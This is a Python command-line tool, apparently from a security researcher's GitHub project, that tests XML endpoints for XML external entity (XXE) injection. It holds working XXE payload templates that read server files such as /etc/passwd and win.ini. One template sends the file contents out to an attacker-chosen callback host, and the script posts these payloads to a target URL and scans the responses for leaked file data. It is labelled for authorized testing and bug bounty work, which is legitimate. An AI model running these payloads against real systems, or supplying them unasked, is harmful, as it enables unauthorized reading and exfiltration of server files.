#!/usr/bin/env python3
"""
XXE Injector — XML External Entity Injection Testing Tool
Tests XML endpoints for XXE via OOB and error-based detection.
Author: Omar Khalid (amooryx) | github.com/amooryx/xxe-injector
AUTHORIZED USE ONLY — for authorized security testing and bug bounty.
"""

import argparse
import json
import random
import string
import sys
import urllib.parse
import urllib.request
import urllib.error

OOB_XXE_TEMPLATE = """\
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [
  <!ENTITY % remote SYSTEM "http://{oob}/xxe?from={marker}">
  %remote;
]>
<root><data>&xxe;</data></root>"""

INBAND_XXE_TEMPLATE = """\
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [
  <!ENTITY xxe SYSTEM "{file}">
]>
<root><data>&xxe;</data></root>"""

ERROR_XXE_TEMPLATE = """\
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [
  <!ENTITY % file SYSTEM "file://{file}">
  <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://{oob}/?data=%file;'>">
  %eval;
  %exfil;
]>
<root/>"""

FILE_TARGETS = [
    "/etc/passwd",
    "/etc/hostname",
    "/proc/version",
    "c:\\windows\\win.ini",
    "file:///c:/windows/win.ini",
]

INDICATORS = [
    "root:x:", "daemon:", "[fonts]", "[extensions]",
    "linux version", "hostname",
]

def rand_str(n: int = 8) -> str:
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=n))

def send_xml(url: str, xml_body: str, extra_headers: dict, timeout: float) -> dict:
    data = xml_body.encode()
    req  = urllib.request.Request(url, data=data, method="POST")
    req.add_header("Content-Type", "application/xml")
    req.add_header("User-Agent",   "XXEInjector/1.0")
    for k, v in extra_headers.items():
        req.add_header(k, v)
    try:
        with urllib.request.urlopen(req, timeout=timeout) as resp:
            body = resp.read(16384).decode(errors="ignore")
            return {"status": resp.status, "body": body}
    except urllib.error.HTTPError as e:
        body = e.read(4096).decode(errors="ignore") if hasattr(e, "read") else ""
        return {"status": e.code, "body": body}
    except Exception as ex:
        return {"status": 0, "error": str(ex), "body": ""}

def test_inband(url: str, extra_headers: dict, timeout: float) -> list[dict]:
    findings = []
    for f in FILE_TARGETS:
        xml  = INBAND_XXE_TEMPLATE.format(file=f)
        resp = send_xml(url, xml, extra_headers, timeout)
        body = resp.get("body", "")
        for ind in INDICATORS:
            if ind.lower() in body.lower():
                findings.append({
                    "type": "inband_xxe", "file": f, "indicator": ind,
                    "status": resp["status"], "excerpt": body[:200],
                })
                print(f"  [!!!] In-band XXE: file={f}  indicator='{ind}'")
                break
    return findings

def test_oob(url: str, oob_host: str, extra_headers: dict, timeout: float) -> list[dict]:
    findings = []
    marker = rand_str(8)
    for f in FILE_TARGETS[:2]:
        xml  = ERROR_XXE_TEMPLATE.format(file=f, oob=oob_host)
        resp = send_xml(url, xml, extra_headers, timeout)
        # OOB is confirmed via external callback — we can only note the attempt
        findings.append({
            "type": "oob_xxe_attempt", "file": f,
            "marker": marker, "oob": oob_host,
            "status": resp["status"],
            "note": f"Check {oob_host} for incoming connection with marker {marker}",
        })
        print(f"  [OOB] Sent XXE to {url} targeting {f}. Check {oob_host}")
    return findings

def main():
    parser = argparse.ArgumentParser(
        description="XXE Injector — XML External Entity Detection (Authorized use only)",
    )
    parser.add_argument("url",        help="Target URL that accepts XML POST data")
    parser.add_argument("--oob",      help="OOB callback host (e.g., xyz.oastify.com)")
    parser.add_argument("--inband",   action="store_true", help="Test in-band XXE")
    parser.add_argument("--all",  "-a", action="store_true")
    parser.add_argument("--timeout",  type=float, default=10)
    parser.add_argument("--header",   nargs="*", help="Extra headers: 'Key: Value'")
    parser.add_argument("--out",      help="Output JSON file")
    args = parser.parse_args()

    headers = {}
    if args.header:
        for h in args.header:
            if ": " in h:
                k, v = h.split(": ", 1)
                headers[k] = v

    if not (args.inband or args.oob or args.all):
        args.all = True

    print(f"[*] XXE testing: {args.url}")
    all_findings = []

    if args.inband or args.all:
        print("[*] Testing in-band XXE (file inclusion) ...")
        all_findings.extend(test_inband(args.url, headers, args.timeout))

    if (args.oob or args.all) and args.oob:
        print(f"[*] Testing OOB XXE via {args.oob} ...")
        all_findings.extend(test_oob(args.url, args.oob, headers, args.timeout))

    print(f"\n[*] {len(all_findings)} findings")
    if args.out:
        with open(args.out, "w") as f:
            json.dump(all_findings, f, indent=2)
        print(f"[*] Results → {args.out}")

if __name__ == "__main__":
    main()
